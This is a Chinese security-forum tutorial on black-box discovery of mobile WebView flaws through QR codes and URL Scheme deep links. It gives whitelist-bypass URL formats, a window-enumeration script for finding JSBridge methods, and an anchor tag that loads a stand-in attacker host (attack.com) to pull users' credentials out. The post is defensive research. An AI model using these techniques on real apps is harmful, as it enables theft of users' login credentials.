> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [bbs.kanxue.com](https://bbs.kanxue.com/thread-289999.htm)

> 看雪安全社区是一个非营利性质的技术交流平台，致力于汇聚全球的安全研究者和开发者，专注于软件与系统安全、逆向工程、漏洞研究等领域的深度技术讨论与合作。

本文主要记录了在移动端探索 WebView 组件漏洞的过程，采用黑盒视角，摒弃复杂繁琐的内部逻辑分析，专注于快速且直接的漏洞挖掘方法。由于笔者才疏学浅，因此本文难免会出现一些文笔不通或专业解释不到位的情况，还望多包涵及斧正。

顾名思义，WebView 组件是用于在应用程序中嵌入和展示 Web 内容的系统组件。通过调用 WebView，开发者能够实现在自己的应用中直接渲染网页，这从某种程度上极大地简化了跨平台应用的开发流程。利用 WebView，开发者只需进行少量适配工作，即可将现有的 Web 应用无缝移植到移动应用环境中，显著提升了开发效率和灵活性。

WebView 组件实际上无处不在。例如，在手机上打开一个商城 APP 时，展示的商品信息可能本质上就是通过 WebView 加载和渲染的网页。在这些实际应用场景中，用户通常不会察觉到 WebView 的存在，并且所有显示的信息可能都是由 APP 预先配置好的。

要想让用户手机上的 APP 调用 WebView 组件对自定义页面进行渲染，方法主要分为两种：**第一类是国内常见的二维码扫码，通过扫描一个指向网页链接的二维码，从而直接调用 WebView 加载特定网页；第二类是 APP 间的跳转调用，即 URL Scheme（在安卓上也称为 Deep Link），通过这种方式可以从一个 APP 直接跳转到另一个 APP 中的特定页面，而这个页面同样可能是通过 WebView 来渲染的。**

APP 上的二维码扫码功能通常作用于用户界面的左右上角，如果找不到的话则可以在 APP 的设置页面中找到 “扫一扫”、“扫码” 等字眼就可以打开相关功能。

![](https://bbs.kanxue.com/upload/attach/202602/943869_SY76253VUZCWJTR.webp)

关于 URL Scheme，对于我来说就是老熟人了，在 2018 年的时候就在博客里浅浅的分享了一下，有兴趣可以看下：https://gh0st.cn/archives/2018-12-08/1。

这里简单说明下，URL Scheme 实际上是应用程序在操作系统层面注册的一种自定义协议格式，它允许 APP 定义特定的协议名，并在 APP 内定义路由和接收参数来完成某些功能，与我们所理解的 HTTP 协议形式的 URL 地址没有什么本质区别。当其他应用或浏览器尝试通过这种自定义协议发起请求时，系统能够识别并定位到相应的应用程序，然后传递所访问的功能路由和参数信息给该应用进行处理。

在 iOS 和 Android 上，对于 URL Scheme 的支持是不一样的，例如在 iOS 上的 Safari 浏览器的地址栏中直接输入 URL Scheme 则可以完成跳转调用。而 Android 默认浏览器下，用同样的方式则会提示找不到网页，因此想要调用 URL Scheme 就需要借助 JavaScript（location 跳转）或 HTML（a 标签 href 点击指向）的方式，在 iOS 上也可以用这种方式。

<table><tbody><tr><td><p>1</p></td><td><p><code>&lt;</code><code>a</code> <code>href</code><code>=</code><code>"xapp://page?url=https://gh0st.cn"</code><code>&gt;Click&lt;/</code><code>a</code><code>&gt;</code></p></td></tr></tbody></table>

![](https://bbs.kanxue.com/upload/attach/202602/943869_NHGC6A7FWKRC8E7.webp)

基于以上所述的两种攻击入口，我发现了许多 APP 上的漏洞，可以通过 WebView 组件直接获取用户凭证。

访问获取凭证是 WebView 组件漏洞面的最基本漏洞，通过扫描二维码或 URL Scheme 跳转调用 WebView 组件打开指定的 URL 地址，接着由于 APP 为设限或存在绕过的情况下，WebView 内访问指定的 URL 地址时会携带凭证信息。

**为什么 WebView 内访问可以携带凭证？** 因为当前 APP 的设计架构采用 Native UI 与 WebView 相结合的方式，以兼顾性能体验与业务灵活性，支持更丰富的应用场景，因此在 APP 上进行登录后，APP 在 WebView 的应用场景下也会携带登录凭证。

#### 二维码扫描

关于二维码扫描的方式比较简单找到入口，如上文所说在 APP 那找到对应功能点即可。以下图所示，图中所展示的案例就是最经典的二维码扫描入口进入 WebView 组件，访问时携带了凭证到达指定 URL 地址。（可以将 URL 地址设为 BurpSuite Collaborator 的地址或类似有 HTTP Log 记录的地址）

如图所示案例实际上有个细节，如二维码内容处打码的部分即为白名单域名，可以通过抓包或知道 APP 归属的域名方式获取该部分。很多 APP 使用 WebView 组件进行访问时，会判断当前访问的页面 URL 地址中的域名部分，有些 APP 在此处判断时比较宽松，例如判断域名是否包含某域名。因此可以通过一些格式对此进行绕过，如：`http://白名单域名.HTTPLog.com`、`http://白名单域名@HTTPLog.com`。

![](https://bbs.kanxue.com/upload/attach/202602/943869_A2Z4SVD5TYKV2HW.webp)

#### URL Scheme 跳转

URL Scheme 按常规逻辑需要通过工具查看 APP 所声明的信息，APK 格式就是文件内的 `AndroidManifest.xml` 文件，IPA 格式就是文件内的 `Info.plist` 文件。但是本文不做偏逆向 / 白盒侧的分享，从黑盒角度出发获取 URL Scheme。

**为什么可以从黑盒出发获取 URL Scheme？** 还是回到 Native UI 与 WebView，因为 WebView 会去访问一些业务 / 功能页面，因此开发也会在 WebView 网站中去写入 APP 的 URL Scheme 信息，从而调起 APP 内的一些 Native 功能，因此只要可以进行抓包即可通过正则匹配的方式获取到完整的 URL Scheme 信息。

如下图所示案例逻辑为：

1.  通过笔者所开发的 HaE 工具配合 BurpSuite 进行抓包，规则就会获取到抓包过程中所出现的 URL Scheme 信息：`xxx://clause/WebView?url=`。
2.  得到该信息之后，将其中的 url 参数设为 HTTPLog 地址：`xxx://clause/WebView?url=http://HTTPLog.com`。
3.  在 iOS 环境下即可通过浏览器复制构建好的地址直接打开然后跳转到 APP 内的 WebView 访问界面。在 Android 环境下，则可以按上文中提到的 HTML 代码方式进行。
4.  最后在 HTTPLog 服务中即可查看是否获取到了凭证信息，如果没有也可以尝试绕过，与二维码扫描处的绕过逻辑是一样的。

![](https://bbs.kanxue.com/upload/attach/202602/943869_SVGYHP2WNQWDMY6.webp)

#### 逻辑与发现

JSBridge 是一种在 App 中实现 JavaScript 与 Native 代码通信的技术方式，可以将 Web 页面中的 JavaScript 调用映射到原生功能中。很多 APP 在使用 JSBridge 映射 JavaScript 与 Native 方法时，未对调用来源的域（Origin）进行校验或白名单限制，导致任意网页或第三方脚本均可通过 JavaScript 直接调用注册的 Native 接口。

这些被注册的接口，可以是全局变量、方法、对象等类型。在 JavaScript 中全局实际上就是窗口对象 Window。也就意味着这些接口都会被注册到 Window 下面。因此，只要进入到 WebView 组件内就可以通过遍历 Window 全局对象的方式来找到被 APP 所注册的接口。

如下代码所示就是一个简易的 Window 全局对象遍历代码。它的缺点很明显，如图所示会将浏览器 / 组件自带的一些方法遍历出来，因此就需要加入输出过滤功能，从而帮助我们更方便的进行 APP 注册接口的寻找。

<table><tbody><tr><td><p>1</p><p>2</p><p>3</p><p>4</p><p>5</p></td><td><p><code>&lt;</code><code>body</code><code>&gt;</code></p><p><code>&lt;/</code><code>body</code><code>&gt;</code></p><p><code>&lt;</code><code>script</code><code>&gt;</code></p><p><code>&nbsp;&nbsp;&nbsp;&nbsp;</code><code>Object.keys(window).forEach(key =&gt; { document.body.innerHTML += `&lt;</code><code>pre</code><code>&gt;${key}:${window[key]}&lt;/</code><code>pre</code><code>&gt;`; });</code></p><p><code>&lt;/</code><code>script</code><code>&gt;</code></p></td></tr></tbody></table>

#### 凭证获取

依旧使用 HaE 的规则通过抓包的方式来获取到 WebView 的 URL Scheme 信息：`xxx://promotion/web`，有些 URL Scheme 信息需要分析业务 JavaScript 文件中的逻辑，如图所示在基础的 URL 信息上还有一个参数 `url`：`xxx://promotion/web?url=`。

![](https://bbs.kanxue.com/upload/attach/202602/943869_M8PK65N4GN849Z2.webp)

如下图所示案例逻辑为：

1.  编写 A 标签跳转页面，用于指定 WebView 组件跳转页面：`<a href="xxx://promotion/web?url=http://可信域名.attack.com/WebView/0.html">Click Me</a>`。
2.  打开跳转页面点击 A 标签，调用起目标 APP 的 WebView 组件访问自动化遍历脚本页面，分析发现 `czbInfo.getAppInfo` 方法可以获取凭证。
3.  构建 JavaScript 外带代码用于验证凭证可以经过网络进行远程获取。

![](https://bbs.kanxue.com/upload/attach/202602/943869_ZEDH2GR49EXFHBT.webp)

本文从黑盒测试的视角，梳理了针对移动端 WebView 组件的漏洞挖掘路径。但是 WebView 组件不仅仅是移动端的特有产物，随着类 CEF （Chromium 嵌入式框架）/ 类 Electron 框架的出现，PC 客户端也同样面临着 WebView 组件攻击风险。

抛出两个思考：除了获取凭证外是否存在其他更高维度的利用面？除了 APP 自身校验缺陷外是否存在系统层的校验不严格问题？

[[培训]Windows 内核深度攻防：从 Hook 技术到 Rootkit 实战！](https://www.kanxue.com/book-section_list-220.htm)